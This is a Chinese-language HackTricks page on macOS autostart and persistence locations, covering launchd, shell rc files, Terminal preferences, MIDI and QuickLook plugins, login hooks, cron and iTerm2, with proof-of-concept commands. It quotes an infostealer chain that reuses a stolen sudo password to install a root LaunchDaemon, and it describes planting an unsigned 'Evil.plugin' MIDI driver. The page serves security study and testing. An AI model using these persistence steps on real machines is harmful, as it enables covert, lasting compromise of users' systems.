# macOS 自动启动

{{#include ../banners/hacktricks-training.md}}

本节主要基于博客系列 [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/)。本节旨在找出可能因写入文件而导致后续代码执行的位置、触发执行的事件，以及所需权限。某个位置存在，并不能证明相应机制已启用。以下本地检查是在 macOS 26.5.2（2026 年 10 月 5 日）上进行的；这些检查并不能证明所有 macOS 版本上的行为都相同。

> [!NOTE]
> “写入触发”并不总是指“写入后立即运行”。某些位置只会在登录时、特定应用启动时或用户执行某项操作时读取。在已配置的任务中写入可写 payload，也不同于有权限注册新任务。依赖某种技术之前，请先在一次性账户或 VM 中进行测试。

## Sandbox Bypass

> [!TIP]
> 在这里，你可以找到可用于 **sandbox bypass** 的启动位置：只需**将内容写入文件**并**等待**某个非常**常见的操作**、确定的**一段时间**，或通常可以在 sandbox 内执行且无需 root 权限的某项**操作**，即可执行内容。

### Launchd

- 可用于 bypass sandbox：[✅](https://emojipedia.org/check-mark-button)
- TCC Bypass：[🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
  - **触发条件**：用户登录（或显式注册）
  - 需要 root 权限
- **`/Library/LaunchDaemons`**
  - **触发条件**：系统启动（或显式注册）
  - 需要 root 权限
- **`/System/Library/LaunchAgents`**
  - **触发条件**：用户登录；受保护的 Apple 系统位置
- **`/System/Library/LaunchDaemons`**
  - **触发条件**：系统启动；受保护的 Apple 系统位置
- **`~/Library/LaunchAgents`**
  - **触发条件**：重新登录

`launchd` 不会扫描 `~/Library/LaunchDaemons` 位置。每用户任务应放在 `~/Library/LaunchAgents`；系统 daemon 目录是 `/Library/LaunchDaemons`。[Apple 的 launchd 启动指南](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html)记录了会被扫描的位置。

> [!TIP]
> 一个有趣的事实是，**`launchd`** 在 Mach-o section `__Text.__config` 中嵌入了一个 property list，其中包含 launchd 必须启动的其他知名服务。此外，这些服务可以包含 `RequireSuccess`、`RequireRun` 和 `RebootOnSuccess`，这意味着它们必须运行并成功完成。
>
> 当然，由于代码签名，无法修改它。

#### Description & Exploitation

**`launchd`** 是 OX S 内核在启动时执行的**第一个** **进程**，也是关机时最后结束的进程。它的 **PID** 始终应为 **1**。此进程会**读取并执行** **ASEP** **plists** 中指定的配置，位置包括：

- `/Library/LaunchAgents`：由管理员安装的每用户 agents
- `/Library/LaunchDaemons`：由管理员安装的系统范围 daemons
- `/System/Library/LaunchAgents`：由 Apple 提供的每用户 agents。
- `/System/Library/LaunchDaemons`：由 Apple 提供的系统范围 daemons。

用户登录时，`launchd` 会以该用户的权限加载其 `~/Library/LaunchAgents` 中的 plists。任务会根据其中的 keys 启动；仅加载 plist 并不意味着进程会立即执行。

**agents 与 daemons 的主要区别在于：agents 在用户登录时加载，而 daemons 在系统启动时加载**（例如 ssh 等服务需要在任何用户访问系统之前运行）。此外，agents 可以使用 GUI，而 daemons 必须在后台运行。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

每个 `ProgramArguments` 元素都是一个独立参数；`launchd` 不会将单个字符串解析为 shell 命令。无需加载即可对上面的修正示例进行语法检查：`plutil -lint /path/to/example.plist`。请参阅本机 `man launchd.plist` 中关于 `ProgramArguments`、`RunAtLoad` 和 `KeepAlive` 的条目。

#### 现有 job 中的文件事件触发器

**已加载**的 agent 或 daemon 可以使用 `WatchPaths`，在指定路径发生变化时启动。目录非空时，`QueueDirectories` 会启动 job；挂载卷时，`StartOnMount` 会启动 job。[Apple 的 launchd 指南](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9)包含 `WatchPaths` 和 `QueueDirectories` 的示例。对受监视文件的写入会触发**已配置的 job**；只有当写入者也能控制该 job 的可执行文件、脚本或 job 会解释的数据时，才会获得任意代码执行能力。仅在扫描或已注册位置之外写入新的 plist，不会使其加载。

这个自清理 PoC 会注册一个名称唯一的**临时用户 agent**，只修改其自身监视的文件，然后移除该 agent。它已在 macOS 26.5.2 上成功运行，无需注销或重启：

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

本地运行输出了 `watch fired: True`，且 `bootout` 成功。这里仅在隔离的 PoC 中使用 `launchctl bootstrap`；对于已加载的 job，不需要使用它。要安全地评估现有 job，请读取其 plist 和解析后的 `ProgramArguments` 路径，然后检查相关可执行文件或被解释执行的文件是否可写，不要对其进行修改。

有些情况下，**agent 需要在用户登录前执行**，这类 agent 称为 **PreLoginAgents**。例如，这对于在登录时提供辅助技术很有用。它们也可以在 `/Library/LaunchAgents` 中找到（参见[**此处**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)的示例）。

> [!TIP]
> 新的 Daemons 或 Agents 配置文件会在**下次重启后加载，或使用** `launchctl load <target.plist>` 加载。也**可以在不带扩展名的情况下加载 .plist 文件**，使用 `launchctl -F <file>`（不过这些 plist 文件不会在重启后自动加载）。\
> 也可以使用 `launchctl unload <target.plist>` **卸载**（它指向的进程会被终止），
>
> 要**确保**没有任何因素（例如 override）**阻止**某个 **Agent** 或 **Daemon** **运行**，请运行：`sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

列出当前用户加载的所有 agents 和 daemons：

```bash
launchctl list
```

#### 恶意 LaunchDaemon 链示例（密码复用）

近期有 macOS infostealer 复用了**窃取到的 sudo 密码**，植入 user agent 和 root LaunchDaemon：<sup>[[1]](#references)</sup>

- 将 agent 循环写入 `~/.agent` 并赋予其可执行权限。
- 在 `/tmp/starter` 生成一个指向该 agent 的 plist。
- 使用 `sudo -S` 复用窃取到的密码，将其复制到 `/Library/LaunchDaemons/com.finder.helper.plist`，设置为 `root:wheel`，并通过 `launchctl load` 加载。
- 通过 `nohup ~/.agent >/dev/null 2>&1 &` 静默启动 agent，使其输出脱离终端。

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> 放在 `/Library/LaunchDaemons` 中的 daemon plist 不会因为设置为用户所有而变得安全。`launchd` 要求系统作业具有适当的所有权和权限，否则可能拒绝不安全的 plist。root 拥有的 daemon 通常以 root 身份运行，除非其配置指定了其他账户。请检查作业的 `UserName`、`GroupName`、所有权以及 `launchctl` 诊断信息；不要仅凭 plist 所有者的名称推断执行身份。

#### 关于 launchd 的更多信息

**`launchd`** 是从 **kernel** 启动的**第一个**用户模式进程。该进程必须**成功启动**，并且**不能退出或崩溃**。它甚至受到保护，不会受到某些**终止信号**的影响。

`launchd` 首先要做的事情之一是**启动**所有**daemons**，例如：

- 根据执行时间触发的 **Timer daemons**：
  - 在 macOS 26.5.2 中，`com.apple.atrun.plist` 会以 `StartInterval = 30` 秒的间隔调用 `/usr/libexec/atrun`；其实际启用状态可能与 plist 的 `Disabled` 键不同，因为 launchd 会单独保存覆盖设置。
  - 当 `/usr/lib/cron/tabs` 中有作业时，`com.vix.cron.plist` 会调用 `/usr/sbin/cron`。`com.apple.systemstats.daily` 是另一个定时服务，并非 cron daemon。
- **Network daemons**，例如：
  - `org.cups.cups-lpd`：通过 TCP 监听（`SockType: stream`），`SockServiceName: printer`
    - SockServiceName 必须是端口，或 `/etc/services` 中定义的服务
  - `com.apple.xscertd.plist`：监听 TCP 端口 1640
- 路径发生变化时执行的 **Path daemons**：
  - `com.apple.postfix.master`：检查路径 `/etc/postfix/aliases`
- **IOKit notifications daemons**：
  - `com.apple.xartstorageremoted`：`"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port：**
  - `com.apple.xscertd-helper.plist`：其 `MachServices` 条目中指定了名称 `com.apple.xscertd.helper`
- **UserEventAgent：**
  - 这与前一种不同。它会让 launchd 响应特定事件来启动应用。不过，在这种情况下，涉及的主二进制文件不是 `launchd`，而是 `/usr/libexec/UserEventAgent`。它会从受 SIP 限制的文件夹 `/System/Library/UserEventPlugins/` 加载插件；每个插件会在 `XPCEventModuleInitializer` 键中指定其初始化器，或者在较旧的插件中，于其 `Info.plist` 的 `CFPluginFactories` 字典中通过键 `FB86416D-6164-2070-726F-70735C216EC0` 指定。

### shell 启动文件

文章：[https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
文章（xterm）：[https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- TCC Bypass：[✅](https://emojipedia.org/check-mark-button)
  - 但你需要找到一个具有 TCC bypass 的应用，并让它执行会加载这些文件的 shell

#### 位置

- **`~/.zshenv`**（或更新的编译版本 **`~/.zshenv.zwc`**）
  - **触发条件**：任何常规 zsh 调用，包括非交互式的 `zsh -c`；`zsh -f` 会跳过用户启动文件。
- **`~/.zshrc`**
  - **触发条件**：交互式 zsh 启动。
- **`~/.zprofile`、`~/.zlogin`**
  - **触发条件**：登录 zsh 启动；它们分别在 `.zshrc` 之前和之后读取。
- **`/etc/zshenv`、`/etc/zprofile`、`/etc/zshrc`、`/etc/zlogin`**
  - **触发条件**：使用 zsh 打开终端
  - 需要 root 权限
- **`~/.zlogout`**
  - **触发条件**：登录 zsh 正常退出时触发，并非每次终端或 shell 退出时都会触发。
- **`/etc/zlogout`**
  - **触发条件**：使用 zsh 退出终端
  - 需要 root 权限
- 可能还有更多内容：**`man zsh`**
- **`~/.bashrc`**
  - **触发条件**：启动交互式**非登录** Bash。交互式登录 Bash 只有在登录文件显式 source 它时才会读取它。
- **`~/.bash_profile`、`~/.bash_login`、`~/.profile`**
  - **触发条件**：启动登录 Bash；按此顺序运行第一个可读文件。如果前两个文件中的任一个存在，就会跳过 `~/.profile`。
- **`/etc/profile`**
  - **触发条件**：启动登录 Bash；修改它需要 root 权限。
- **`~/.tcshrc`**，或在其不存在时使用 **`~/.cshrc`**
  - **触发条件**：启动 `tcsh`，在这台 Mac 上也包括非交互式的 `tcsh -c`。用户必须实际调用 `tcsh`；它不是 macOS 的默认 shell。
- **`~/.login`**
  - **触发条件**：登录 `tcsh` 在其 rc 文件之后启动。
- `~/.xinitrc`、`~/.xserverrc`、`/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **触发条件**：预期会在使用 xterm 时触发，但它**未安装**；即使安装后也会报错：xterm：`DISPLAY is not set`<sup>[[3]](#references)</sup>

#### 描述与利用

启动 `zsh` 或 `bash` 等 shell 环境时，会运行**某些启动文件**。macOS 目前默认使用 `/bin/zsh` 作为 shell。Terminal 或 SSH 是否启动登录 shell 或交互式 shell，取决于其配置；不要假定上述每个文件都会在每个会话中运行。虽然 macOS 也包含 `bash` 和 `sh`，但必须显式调用它们才能使用。<sup>[[2]](#references)</sup> [zsh 启动文件参考](https://zsh.sourceforge.io/Doc/Release/Files.html)说明了文件的读取顺序、`ZDOTDIR` 覆盖项以及 `.zwc` 规则。

以下只读实验在 macOS 26.5.2 上使用了一次性 `ZDOTDIR`。它展示了读取了哪些用户文件；实验没有修改任何实际的 shell 启动文件：

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

观察到的顺序为 `-c`：`zshenv`；`-ic`：`zshenv zshrc`；`-lc`：`zshenv zprofile zlogin`；`-lic`：`zshenv zprofile zshrc zlogin zlogout`。`ZDOTDIR` 必须已经指向备用目录；仅在任意目录中写入文件是不够的。

[Bash 的启动文件参考](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)区分了登录 shell 和交互式 shell。在 macOS 26.5.2 测试机上，包含全部四个用户启动文件的独立 `HOME` 得到以下结果：`bash -c` → 无；`bash -ic` → `.bashrc`；`bash -lc` 和 `bash -lic` → 仅 `.bash_profile`。移除 `.bash_profile` 后，登录 Bash 会读取 `.bash_login`；若该文件也被移除，则会读取 `.profile`。`BASH_ENV` 可以让非交互式 Bash 读取指定文件，但必须在调用进程中预先设置该环境变量。登录 Bash 中显式执行 `exit` 也可能加载 `~/.bash_logout`。

本地的 `tcsh(1)` 手册记录了其独立的启动顺序。使用临时 `HOME` 时，`/bin/tcsh -c :` 会读取 `.tcshrc`；若 `.tcshrc` 不存在，则会读取 `.cshrc`。临时登录 `tcsh` 会读取 `.tcshrc` 和 `.login`。这些检查只创建并移除了临时文件。

### 重新打开的应用程序

> [!CAUTION]
> 测试中，配置所示的利用方式并注销再重新登录，甚至重启，都不会执行该应用程序。执行这些操作时，应用程序可能需要处于运行状态。

**文章**：[https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **触发条件**：重启时重新打开应用程序

#### 描述与利用

要重新打开的所有应用程序都记录在 plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` 中<sup>[[4]](#references)</sup>

因此，要让重新打开应用程序的功能启动你自己的应用程序，只需**将你的应用程序添加到列表中**。

可以通过列出该目录，或运行 `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` 来查找 UUID。

若要检查将重新打开的应用程序，可以运行：

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

要**将应用程序添加到此列表中**，可以使用：

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Terminal 偏好设置

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal 曾拥有用户的 FDA 权限

#### 位置

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **触发条件**：使用 Shell 设置中包含启动命令的配置文件打开新的 Terminal 窗口或标签页

#### 描述与利用

**`~/Library/Preferences`** 中存储着用户在各个应用程序中的偏好设置。其中一些偏好设置可以包含用于**执行其他应用程序/脚本**的配置。<sup>[[5]](#references)</sup>

例如，Terminal 可以在启动时执行命令：

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

此配置会反映在文件 **`~/Library/Preferences/com.apple.Terminal.plist`** 中，如下所示：

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

如果相关 profile 中包含启动命令，并且 Terminal 读取了该偏好设置，那么使用该 profile 创建的新会话就可以执行此命令。[Apple 当前的 Terminal 指南](https://support.apple.com/guide/terminal/trmlshll/mac)介绍了每个 profile 的 **Shell → Startup** 命令。仅打开 Terminal，而不使用该 profile 创建新会话，并不足以触发执行。以下偏好设置编辑操作**未**在研究用 Mac 上执行。

你可以通过 CLI 添加此设置：

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal Scripts / Other file extensions

- Useful for bypassing sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal 可使用用户授予的 FDA 权限

#### Location

- **任意位置**
  - **Trigger**：打开特定的 `.terminal`、`.command` 或 `.tool` 文件

#### Description & Exploitation

如果用户打开 **`.terminal`** 设置文件，Terminal 可以根据其配置文件创建会话；可执行的 **`.command`** 和 **`.tool`** 文件也可以在 Terminal 中打开。这是由显式打开文件触发的，并非仅仅打开 Terminal 就会执行。任何继承的 TCC 访问权限都取决于 Terminal 实际获授的权限以及尝试执行的操作。下面的历史示例未在研究用 Mac 上运行。

尝试运行：

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

你也可以使用扩展名 **`.command`**、**`.tool`**，其中包含常规 shell 脚本内容，它们也会由 Terminal 打开。

> [!CAUTION]
> 如果 Terminal 拥有**全磁盘访问权限**，它就能完成该操作（请注意，执行的命令会显示在 Terminal 窗口中）。

### 音频插件

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - 你可能会获得一些额外的 TCC 访问权限

#### 位置

- **`/Library/Audio/Plug-Ins/HAL`**
  - 需要 root 权限
  - **触发条件**：Core Audio 服务器加载兼容的 HAL 设备插件；重启服务器可能会触发重新发现
- **`/Library/Audio/Plug-ins/Components`**
  - 需要 root 权限
  - **触发条件**：音频主机发现并实例化已安装的 Audio Unit
- **`~/Library/Audio/Plug-ins/Components`**
  - **触发条件**：音频主机发现并实例化已安装的 Audio Unit
- **`/System/Library/Components`**
  - Apple 提供的系统保护位置
  - **触发条件**：音频主机实例化匹配的系统组件

#### 说明

根据前面的 writeup，可以**编译一些音频插件**并使其加载。<sup>[[6]](#references)[[7]](#references)</sup>

HAL 设备插件和 Audio Units 使用不同的加载路径。[Apple 的 Audio Unit 主机指南](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html)指出，主机必须找到并实例化组件；将组件复制到扫描目录或重启 `coreaudiod` 本身并不能证明代码已执行。AUv2 插件在主机进程中运行，而[Apple 当前的 Audio Unit 指南](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments)指出，AUv3 在 macOS 上默认在独立进程中运行。签名、sandbox 和 library-validation 检查取决于主机。研究用 Mac 上没有安装或执行任何音频插件。

### CoreMIDI 驱动（MIDIServer）

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
  - 你的代码在 `MIDIServer` 进程中运行，而不是在你应用的 sandbox 中运行
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` 在自己的 `seatbelt` sandbox 配置文件下运行

#### 位置

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - 无需 root 权限（用户可写）
  - **触发条件**：`MIDIServer` 启动或重新启动。任何进程首次使用 CoreMIDI 时，系统会按需启动它（例如打开 *Audio MIDI Setup*、GarageBand、DAW，或使用 WebMIDI 的网页）
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - 需要 root 权限
  - **触发条件**：同上

#### 说明与利用

Apple 的 `MIDIServer`（`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`）会从 `Audio/MIDI Drivers` 目录加载 MIDI **驱动** bundle。该二进制文件由 Apple 签名，但带有 `com.apple.security.cs.disable-library-validation` entitlement，因此它会加载**未签名或由其他团队 ad-hoc 签名的** bundle，从而在独立的 Apple 所有进程中实现代码执行，**无需 root 权限**。<sup>[[53]](#references)</sup>

已在 macOS 26 上验证（只读）：

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

驱动程序是一个标准 bundle，会导出 `MIDIDriverInterface` 工厂；将 payload 放入工厂/构造函数中，就能在 `MIDIServer` 枚举驱动程序时立即运行。构建它，将其放到 `~/Library/Audio/MIDI Drivers/Evil.plugin`，然后触发加载，无需注销或重启：

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook 插件

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- TCC 绕过：[🟠](https://emojipedia.org/large-orange-circle)
  - 你可能会获得一些额外的 TCC 访问权限

#### 位置

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### 描述与利用

当你**触发文件预览**（在 Finder 中选中文件后按空格键），且已安装**支持该文件类型的插件**时，QuickLook 插件便可执行。<sup>[[8]](#references)</sup>

你可以编译自己的 QuickLook 插件，将它放在上述任一位置以加载，然后找到受支持的文件并按空格键来触发它。

这些路径对应的是旧版 `.qlgenerator` bundle；[Apple 的 Quick Look 架构指南](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html)介绍了搜索顺序和文件类型匹配规则。当前的 Quick Look **app extension** 随 app 一起打包，注册和执行规则也有所不同。存在 generator 并不能证明它会被选中来处理该类型，也不能证明其代码会在 Finder 本身中运行。我们根据文档和目录是否存在检查了旧版 generator 路径；研究用 Mac 上没有安装或加载任何 generator。

### ~~登录/注销 Hooks~~

> [!CAUTION]
> 这对我不起作用，用户的 LoginHook 和 root 的 LogoutHook 都不行。

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- TCC 绕过：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- 你需要能够执行类似 `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` 的命令
  - 位于 `~/Library/Preferences/com.apple.loginwindow.plist`

这些功能已弃用，但可用于在用户登录时执行命令。<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

此设置存储在 `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`】【。

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

若要删除它：

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

root 用户对应的项目存储在 **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> 在这里可以找到适用于 **sandbox bypass** 的启动位置，让你只需**将内容写入文件**，并**依赖不太常见的条件**（例如安装了特定**程序**、用户执行了“罕见”操作，或特定环境）即可执行某些内容。

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但你需要能够执行 `crontab` binary
  - 或者拥有 root 权限
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`**
  - 直接写入需要 root 权限。如果你能执行 `crontab <file>`，则不需要 root 权限。
  - **触发条件**：已安装 crontab 中的计划。`at` 和 `periodic` 是下文介绍的独立机制。

#### Description & Exploitation

使用以下命令列出**当前用户**的 cron jobs：

```bash
crontab -l
```

系统 cron 守护进程的 launchd plist 中有一个 `QueueDirectories` 条目，指向 `/usr/lib/cron/tabs`；已安装的用户 crontab 保存在此处。检查其他用户的 crontab 需要 root 权限：

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

在一次性账户中，可以使用 `crontab` 安装一个仅包含标记的用户 cron 条目，并在观察后将其移除。运行 `crontab <file>` **会替换该账户现有的整个 crontab**，因此如果账户不是一次性的，请先保存并在之后恢复：<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC 绕过: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 曾被授予 TCC 权限

#### 位置

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **触发条件**：在该文件夹中放置符合要求的 Python API 脚本并启动 iTerm2
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **触发条件**：启动 iTerm2；AppleScript 启动钩子的文档另行介绍
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **触发条件**：使用其命令或初始文本会调用 payload 的配置文件创建会话

#### 描述与利用

